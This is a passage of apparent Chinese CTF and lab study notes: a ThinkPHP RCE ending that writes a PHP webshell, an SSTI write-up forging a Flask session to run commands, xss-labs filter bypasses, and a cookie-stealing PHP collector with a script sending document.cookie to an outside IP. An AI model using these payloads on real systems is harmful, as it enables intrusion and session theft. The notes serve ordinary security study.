&#x27;GET&#x27;;\n\n进行污染，绕过后面的switch然后还有一个参数是method=get我实在不知道这个是干什么用的了，等到我成为大佬的那一天搞不好就会了\n这个复现文章写了好长，也写了很多和漏洞没多大关系的废话，但是之前对后端开发的知识太少了，这也是第一次审TP漏洞，对我来说实在太难了，有很多细节代码也没看，也看不懂，甚至都没有完全的知道payload的各个参数是为什么，用了两天多也没看明白\n2.漏洞复现最后放一下漏洞复现的图片吧\n\n\n这里使用了passthru来执行命令，也可以，但是不能用eval来执行代码，因为eval虽然看起来和函数差不多但实际上是PHP的一种语言结构，无法被call_user_func进行调用\n最后通过echo去往代码中写一句话木马\necho &#x27;&lt;?php eval($_POST[1]); ?&gt;&#x27; &gt; 1.php\n\n\n\n成功上传wehshell\n"},{"title":"[watevrCTF-2019]Supercalc","url":"/2025/05/27/watevrCTF-2019-Supercalc/","content":"[watevrCTF-2019]Supercalc进入题目是一个输入框，根据题目supercalc，猜测这是一个计算器，我们尝试输入1+1发现回显计算结果，直接猜测SSTI。\n输入&#123;&#123;7*7&#125;&#125;，发现报错You cant use ast.Set m8，猜测不能使用&#123;&#125;，看了大佬的WP，发现这种情况可以输入1/0让题目报错，我们可以拿到部分信息\n\n\n于是又从大佬那学到一招\n1/0#&#123;&#123;config&#125;&#125;#应该是正则匹配过滤的时候注释符号有作用了\n\n我们可以从配置文件中拿到key\ncded826a1e89925035cc05f0907855f\n\n\n\n\n\n我们这个时候去查看cookie发现有session，由于是SSTI注入，怀疑是flask_session，我们进行解码拿到\n&#123;&quot;history&quot;:[&#123;&quot;code&quot;:&quot;1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;]&#125;\n\n发现是这样的形式，发现code后面的就是SSTI注入的内容\n先尝试直接进行注入\n1/0#&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&#125;\n\n回显I dont like that long floor m8，发现太长了，看来只能去改cookie的方式去执行了\n我们尝试了几个payload的时候发现不知道为什么平时一些固定的payload都不能用，只能用题解的那个\n于是直接进行加密\npython flask_session_cookie_manager3.py encode -s cded826a1e89925035cc05f0907855f7 -t &quot;&#123;&#x27;history&#x27;: [&#123;&#x27;code&#x27;: &#x27;__import__(\\&quot;os\\&quot;).popen(\\&quot;cat flag.txt\\&quot;).read()&#x27;&#125;]&#125;&quot;\n\n需要注意的是不知道为什么我这个key不能用单引号引起来，引起来加密结果就错误，要么就用双引号，要么就不用引号\neyJoaXN0b3J5IjpbeyJjb2RlIjoiX19pbXBvcnRfXyhcIm9zXCIpLnBvcGVuKFwiY2F0IGZsYWcudHh0XCIpLnJlYWQoKSJ9XX0.aDWXjA.pHbc495qtZ5_tIZYoLI8C6DJeS8\n\n\n"},{"title":"xss","url":"/2025/02/13/xss/","content":"XSS笔记前言在命令执行之后，我选择开始XSS的学习，主要是因为其他人也在学，我不能一意孤行，那样的话就不容易偏移轨道，话说他妈的我心理健康给重修了，没想到第一学期就寄了，又要花时间去刷学习通，妈的傻逼学校，学习通没刷完就不准我参加考试\n1.XSS漏洞原理1.概述XSS被称为跨站脚本攻击（Cross Site Scripting），由于和层叠样式表（Cascading Style Sheets，CSS）重名，改为XSS。\n主要基于JavaScript语言进行恶意攻击，因为js非常灵活操作html、css、浏览器。\n2.利用执行方式利用网页开发时web应用程序对用户输入过滤不足导致将恶意代码注入到网页中，使用户浏览器加载并执行恶意代码，通常是JavaScript类型，也包括java、vbs、flash、html等。\n用户浏览被XSS注入过的网页，浏览器就会解析这段代码，就被攻击了。因为浏览器当中有JavaScript解析器，浏览器不会判断代码是否恶意，只要符合语法规则，就直接解析了。\n3.XSS危害盗取cookie\n因为大部分人喜欢将密码储存到浏览器当中，所以黑客一般渗透的时候就会先来浏览器查看已保存的cookie 来盗取各种用户账号\n未授权操作\njs特性很强大，黑客会直接代替用户在html进行各类操作。比如劫持会话，刷流量，执行弹窗广告，还能记录用户的键盘输入。\n4.简单代码&lt;?php$input = $_GET[&quot;XSS&quot;];etho &quot;&lt;div&gt;&quot;.$input.&quot;&lt;/div&gt;&quot;;?&gt;感觉这就是一句话后门\n\n5.XSS验证当在测试页面上提交以下代码，浏览器执行之后会出现弹窗，这是为了验证js代码是否被执行，代码被当做字符串输出在HTML页面上，浏览器当中的JavaScript解析器会根据\n&lt;script&gt;alert(/xss/)&lt;/script&gt;           #比较常用&lt;script&gt;confirm(&#x27;xss&#x27;)&lt;/script&gt;&lt;script&gt;prompt(&quot;xss&quot;)&lt;/script&gt;\n\n2.XSS漏洞分类1.反射型XSS非持久型XSS，最容易出现的XSS漏洞。\n原理\n用户在请求某个URL地址时，会携带一部分数据。当客户端进行访问某条链接时，攻击者可以将恶意代码注入到URL，如果服务器端未对URL携带的参数做判断和过滤，直接返回响应页面，那么XSS攻击代码就会被一起传输到用户的浏览器，触发反射型XSS。\n也就是说，在网址上写下恶意代码，让访问者不注意到，然后影响回显页面来搞事\n特点\n非持久性参数脚本js代码在web应用的参数当中：搜索框\n数据流量：浏览器—-&gt;后端—-&gt;浏览器\n实例：\n当用户进行搜索时，返回结果通常包括用户的原始搜索内容，如果攻击者精心构造包含XSS恶意代码的链接，诱导用户点击并成功执行，用户的信息就被窃取了，甚至还可以模拟用户进行一些操作。\n利用URL编码来迷惑\n\n\n生成短网址，用来掩饰，造成迷惑\n2.存储型XSS原理\n被保存到服务器上，显示到HTML页面中，经常出现在用户评论的页面，攻击者将XSS代码保存到数据库中，当用户在此访问这个页面时，就会触发并执行XSS代码，窃取用户的敏感信息。\n因为储存并且会把内容回显到网页，所以每次访问网页都会触发并执行XSS代码\n特点\n危害性最大：持久的保存在服务器上持久型XSSjs代码不在某个参数中，而是被写进了数据库或文件可以永久保存数据的介质中，如留言板等。\n数据流量走向：浏览器—&gt;后端—&gt;数据库—&gt;后端—&gt;浏览器\n3.DOM型XSSDOM\nDOM（Document Object Model）即文档对象模型，是W3C制定的标准接口规范，是一种处理HTML和XML文件的标准API。DOM提供了对整个文档的访问模型，将文档作为一个树形结构，树的每个结点表示了一个HTML标签或标签内的文本项。DOM树结构精确地描述了HTML文档中标签间的相互关联性。将HTML或XML文档转化为DOM树的过程称为解析(parse)。HTML文档被解析后，转化为DOM树，因此对HTML文档的处理可以通过对DOM树的操作实现。DOM模型不仅描述了文档的结构，还定义了结点对象的行为，利用对象的方法和属性，可以方便地访问、修改、添加和删除DOM树的结点和内容。\n如果要知道DOM是什么还是太难了，而且没什么用。\nDOM的作用\n通过上面的详细介绍，我想小伙伴们都差不多知道DOM的作用了。就是为了让JavaScript可以对文档中的标签、属性、内容等进行 访增删改 操作。\n举几个简单的例子：\n//html内容&lt;div&gt;我是div元素&lt;/div&gt;&lt;p id=&quot;p&quot;&gt;我是p元素&lt;/p&gt;//访var div = document.getElementsByTagName(&#x27;div&#x27;)var p = document.getElementById(&#x27;p&#x27;)//增// 创建一个a元素var a = document.createElement(&#x27;a&#x27;)// 添加到bodydocument.body.append(a)//删// 移除body中的div子节点document.body.removeChild(div)//改div.innerHTML = &#x27;我修改了div的文本内容&#x27;\n\n原理\n基于文档对象模型（DOM）的一种漏洞。这种XSS与反射型XSS、存储型XSS有着本质的区别，它的攻击代码不需要服务器解析响应，触发XSS依靠浏览器端的DOM解析，客户端的JavaScript脚本可以访问浏览器的DOM并修改页面的内容，不依赖服务器的数据，直接从浏览器端获取数据并执行。\n特点\n非持久性\n数据流量：URL—&gt;浏览器\n3.XSS payload受不了了，XSS怎么这么难，而且网上我看到的教程怎么根本看不懂^_^，还有怎么突然要写js了，而且全是以前没见过的操作\nXSS payload我感觉没什么特指，应该指的就是攻击的恶意代码吧，小到一个alert()弹窗，大到直接劫持cookie所以学到什么算什么\n我感觉这个可以先停一下了，先学习一下绕过方式吧，ctfshow上面的题目要公网Ip才可以拦截cookie，所以只能在自己靶场上练绕过了\npayload的话用XSS平台倒是会自动生成一些\n4.绕过方式1.level2 闭合level1的话没有任何过滤，直接写js就行了，但level2对输入内容进行了转义，导致写入变为：\n&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;不知道转义规则，但可以找到的是直接写入用不了，但是页面存在回显\n\n我们看源码发现\n\n\n这个地方未经过滤就写入了，我们直接闭合\n&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;\n\n后面去看源码\n\n\n通过htmlspecialchars()函数对输入进行转义\nhtmlspecialchars()\nhtmlspecialchars() 函数把预定义的字符转换为 HTML 实体。\n预定义的字符是：\n\n&amp; （和号）成为 &amp;\n“ （双引号）成为 “\n‘ （单引号）成为 ‘\n&lt; （小于）成为 &lt;\n&gt; （大于）成为 &gt;\n\n提示：如需把特殊的 HTML 实体转换回字符，请使用 htmlspecialchars_decode() 函数。\n2.level3 事件绕过这次全部输入都被转义了，于是题解上出现了事件绕过。\n使用事件就可以在没有&lt;&gt;的情况下触发js代码\n&#x27; onfocus=javascript:alert(1) &#x27;\n\n这里使用了闭合绕过和js伪协议，值得一提的是即使我们拼接的语句存在错误有时候浏览器也能正常执行，但有的错误又会出错。\n我们事件拼接到哪里，触发哪里即可。这次是输入框\n&lt;input name=keyword  value=&#x27;&#x27; onfocus=javascript:alert(1) &#x27;&#x27;&gt;\n\n3.level5 插入标签绕过level5看直接上源代码\n$str = strtolower($_GET[&quot;keyword&quot;]);//小写转换函数，将所有字母转换为小写$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;\n\n这次过滤掉了on和&lt;script，对其进行了简单的替换，但是on就涵盖了所有我已知的事件，所以不能用事件绕过了\n\n\n\n事件\n描述\n\n\n\nonchange\nHTML 元素改变\n\n\nonclick\n用户点击 HTML 元素\n\n\nonmouseover\n鼠标指针移动到指定的元素上时发生\n\n\nonmouseout\n用户从一个 HTML 元素上移开鼠标时发生\n\n\nonkeydown\n用户按下键盘按键\n\n\nonload\n浏览器已完成页面的加载\n\n\n还是看题解，发现需要使用标签，这和xss平台上拦截cookie使用的方法相似。我们利用标签的href属性写js代码并闭合，但这种方法必须使&lt;&gt;不被过滤\n&quot;&gt;&lt;a href=javascript:alert(1)&gt;xxx&lt;/a&gt;\n\n\n\n前面的闭合符必须闭合，但后面的浏览器会自动作为普通字符处理\n4.level6 大写绕过level6的话目测比上一关多过滤了href，还是直接上源码\n$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;\n\n发现过滤掉了很多关键字，但比上一关少过滤了大小写，那么直接大写绕过\n&quot;&gt;&lt;sCript&gt;alert(1)&lt;/sCript&gt;\n\n5.level7 双写绕过$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;\n\n这次相比上一关，把大小写过滤掉了，而且这次关键词过滤直接替换为空了，这明显是机会，之前sql注入时也遇到过这样的直接双写绕过\n&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&quot;&gt; &lt;a hrehreff=javasscriptcript:alert()&gt;x&lt;/a&gt;\n\n源码里面也过滤掉了src，我记得src是img的一个属性，用来放图片加载链接的，访问图片会和一样触发js代码\n至于data的话还没遇见过，抄个实例下来\n&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#x27;xss&#x27;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;\n\n\n\n6.level8 href编码绕过level8关键字尝试的时候，发现str没被过滤，那就直接闭合上图片链接\n&quot;&gt;&lt;img str=javascript:alert(1)&gt;\n\n但是不行，直接上源代码\n$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;\n\n发现他把”过滤掉了，换成了&amp;quot。仔细一看发现我实在有点草率，script被过滤了，javascript也不能用，直接使用图片当然不行，作为一个思路吧\n看了题解，发现我们可以利用链接写入js代码，虽然很多关键词被过滤掉了，但是我们能利用href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议\njavascript:alert()&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;\n\n\n\n7.level9 插入指定内容绕过首先还是照常看插入点，刚开始只发现value属性有插入，但&lt;和”都被过滤，现在还没有办法解决，但发现链接中有一句话\n\n\n我猜测在链接处有过滤，直接看源码\n$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;&lt;?phpif(false===strpos($str7,&#x27;http://&#x27;))&#123;  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;        &#125;else&#123;  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;?&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt;\n\n也就是说，我们的插入必须包含http:&#x2F;&#x2F;才能显示我们插入链接，结合上一关的编码绕过\n&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */不知道为什么，http://放在前面不行，明明注释符也写了，但还是会被识别为链接\n\n8.level10 隐藏传参根本看不到什么东西，直接上源码\n&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;\n\n我们看页面源代码也发现存在三个type&#x3D;”hidden”的输入，查找后发现\ntype:”hidden”\n隐藏域在页面中对于用户是不可见的，在表单插入中隐藏域的目的在于收集和发送信息，以利于被处理表单的程序所使用注：隐藏只是在网页页面上不显示输入框，但是虽然隐藏了，还是具有form传值功能。一般用来传值，而不必让用户看到。\n也就是说没有输入框，但存在传值。但是这样的输入有三个，我们可以通过GET请求去传值，传到t_sort的时候发现value值有变化，于是判断隐藏传参为t_sort\n&lt;&gt;也被过滤掉了，我们无法直接闭合标签，好在on没被过滤可以使用事件绕过\n&#x27;&quot; onfocus=javascript:alert(1) type=text/*需要把type改为可显示的*/\n\n9.level11 HTTP头绕过这里的话，和10不同在于多了一个t_ref代表的是referer即上一个网址，而且还发现t_sort中”被过滤了，也就无法闭合value\n源码：\n$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;\n\n发现t_sort被实体化，直接没用了，只能通过t_ref了，那也就意味着抓包改referer\n不知道为什么，靶场的包突然抓不了了，其他网页的包却可以抓\n解决了，原因未知，但网上说只要把访问ip从127.0.0.1改为192.168.84.1(本机ip)即可，试了一下果然可以抓了\n能抓包就简单了，和上一关一样通过referer写入即可\n&#x27;&quot; onfocus=javascript:alert() type=text\n\n后面几关就是http头的老套路，直接速通\nlevel12 user-agent&#x27;&quot; onfocus=javascript:alert() type=text\n\nlevel13还是有点不同，没有直接放出来，但是看到一个t_cook的参数，决定就是它了，发现传进去的话会得到\n&lt;input name=&quot;t_cook&quot;  value=&quot;call me maybe?&quot; type=&quot;hidden&quot;&gt;\n\n上源代码：\n$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;\n\n也就是我们需要从cookie下手\n\n\n果然，直接改cookie\n&#x27;&quot; onfocus=javascript:alert() type=text\n\nlevel14的话，网上只有一个结果，说网站挂掉了，具体怎么挂的不知道，跑路就对了\n10.level15 ng-include文件包含ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号\n查了一下，ng-include用于包含html文件，但什么都没有，直接看源码：\n&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;?&gt;\n\n网站上什么都没有，不看源码不行啊，但是这里进行了html实体化，这个以前遇到就放弃的函数，现在来了\nphp文件也可以被包含，我们尝试包含第一关\n?src=&#x27;/level1.php&#x27;\n\n我们可以包涵第一关并让第一关弹窗（注意，这里不能包涵那些直接弹窗的东西如，但是可以包涵那些标签的东西比如、、、标签等等，这些标签是能需要我们手动点击弹窗的），这里我们使用img标签，构造payload\n?src=&#x27;level1.php?name=&lt;a href=javascript:alert()&gt;xxx&lt;/a&gt;&#x27;?src=&#x27;level1.php?name=&lt;img src=d onerror=javascript:alert()&gt;&#x27;各种通过触发的弹窗都可以\n\n11.level16 空格过滤源代码：\n$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot;\t&quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt;\n\n把空格和/过滤掉了，也就是我们无法直接闭合，所以那些需要闭合的标签如：不能用了，我们可以尝试等不需要闭合的标签，至于空格，我们之前就试过可以用回车%0a代替\n?keyword=&lt;img%0asrc=a%0aonerror=alert(1)&gt;\n\n后面的关卡的话没什么含金量了，17，18关就是onmouse的使用，而且插件有问题，用的标签是\n网上的说法是HTML &lt;embed&gt; 元素将外部内容嵌入文档中的指定位置。此内容由外部应用程序或其他交互式内容源（如浏览器插件）提供。\n请记住，大多数现代浏览器已经弃用并取消了对浏览器插件的支持，所以如果你希望你的网站可以在普通用户的浏览器上运行，那么依靠通常是不明智的。\n后面的也是插件不支持\n5.常用插入语句script\n&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;\n\nimg\n图片加载错误时触发&lt;img src=&quot;x&quot; onerror=alert(1)&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#x27;xss&#x27;)&quot;)&gt;鼠标指针移动到元素时触发&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;鼠标指针移出时触发&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;\n\na\n&lt;a href=&quot;https://www.qq.com&quot;&gt;qq&lt;/a&gt;&lt;a href=javascript:alert(&#x27;xss&#x27;)&gt;test&lt;/a&gt;&lt;a href=&quot;javascript:a&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;&lt;a href=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;a&lt;/a&gt;&lt;a href=&quot;&quot; onclick=eval(alert(&#x27;xss&#x27;))&gt;aa&lt;/a&gt;&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#x27;xss&#x27;) y=2016&gt;aa&lt;/a&gt;\n\n\n\n6.有云服务器后终于配置好自己的云服务器了，也就是终于有公网ip可以去写ctfshow的题目了，我会介绍下使用方法\n首先，我们把获取cookie的php脚本部署到我们的网站上，由于没买域名，所以只能通过ip访问\n118.31.168.4:1996/cookie.php\n\n源代码：\n&lt;?phpecho &#x27;hello&#x27;;if(isset($_GET[&#x27;cookie&#x27;])) &#123;    $cookie = $_GET[&#x27;cookie&#x27;];        // 过滤和清理用户输入    $cookie = htmlspecialchars($cookie); // 过滤特殊字符    // 其他可能的过滤和验证     // 写入文件    $myfile = fopen(&#x27;cookie.txt&#x27;, &#x27;a&#x27;);    if ($myfile !== false) &#123;        fwrite($myfile, $cookie.&quot;\\n&quot;);        fclose($myfile);        echo &#x27;Cookie 已成功写入文件。&#x27;;    &#125; else &#123;        echo &#x27;无法打开文件进行写入。&#x27;;    &#125;&#125; else &#123;    echo &#x27;未提供 cookie 数据。&#x27;;&#125;?&gt;\n\n这是一个简单的通过GET请求获取cookie的脚本，会在目录下生成一个.txt的文件储存cookie，我们用蚁剑给自己开后门就能轻易看到数据了\n然后我们就直接开启ctfshow吧\n由于第一关就是最简单的无过滤反射，所以直接写代码\n&lt;script&gt;window.location.href=&#x27;http://118.31.168.4:1996/cookie.php?cookie=&#x27;+document.cookie&lt;/script&gt;\n\n也是写上ctfshow了\n"},{"title":"信息收集","url":"/2025/02/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","content":"信息收集笔记前言实验室已经断电从去年断到今年了，学长说明天有电工来修，我之前一度怀疑我们学校更本不存在电工。今天也是差不多把留言板写完了，之前也不知道开学需要检查这东西，但现在只差把它挂到公网上去和做防护即可。\n信息收集感觉很基础，也没有什么固定的解题手法，所以跟着ctfshow把题目做了感觉就差不多了\nJS前台拦截 &#x3D;&#x3D; 无效操作ctfshow的第二关把我们右键用js拦截掉了，但是有很多方法去查看页面源码\n我们可以直接在浏览器调出开发者工具或者使用view-source协议\n我们只需要输入view-source: sURL就行了\n或者Ctrl+U也行\nrobots.txtrobots.txt是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被robots访问的部分，或者指定搜索引擎只收录指定的内容。\n当一个搜索机器人（有的叫搜索蜘蛛）访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，那么搜索机器人就沿着链接抓取。\n也就是说，这是一个反读取的文件，里面记录了网站不想被读取的文件，然后搜索引擎就不会去访问\n由于在根目录下，我们直接访问就可以得到\nhttps://87b8ab05-aa47-46ea-bdd7-d11643d8a7db.challenge.ctf.show/robots.txt\n\nphps源码泄露有时候能帮上忙这道题有点看不懂，但是我感觉只需要知道怎么下载php源码即可\nctfshow目录下面一定有index.php文件，在有漏洞时只需要访问index.phps就可以下载源码\n解压源码到当前目录这个我感觉和上一关差不多\n由于网站的文件都是放置在www文件夹下面的，zip是一种压缩格式。也就是www文件夹里面的文件全部压缩在www.zip里面了，所以我们直接访问www.zip\n得到两个文件，其中有一个文件是fl000g.txt，打开文件查看，给了提示说flag就在这个fl000g.txt，因此我们在url上继续访问fl0000g.txt文件\n话说什么时候才会把源码的压缩包放到更目录下面\n版本控制很重要，但不要部署到生产环境更重要这就是把一些重要文件放到网站根目录下面了，没什么好说的\n7，8关分别为.git和.svn文件\n发现网页有个错别字？ 赶紧在生产环境vim改下，不好，死机了 本题目的是让答题者了解到vim编辑器使用时会有一个缓存文件，这个缓存文件在保存时进行删除，但是在vim意外退出时这个缓存文件，会以源文件加一个.swp后缀进行保存，我们可以尝试访问这些文件来尝试获取一些文件。\n因此此题直接访问index.php.swp文件，进行下载并查看\ncookie 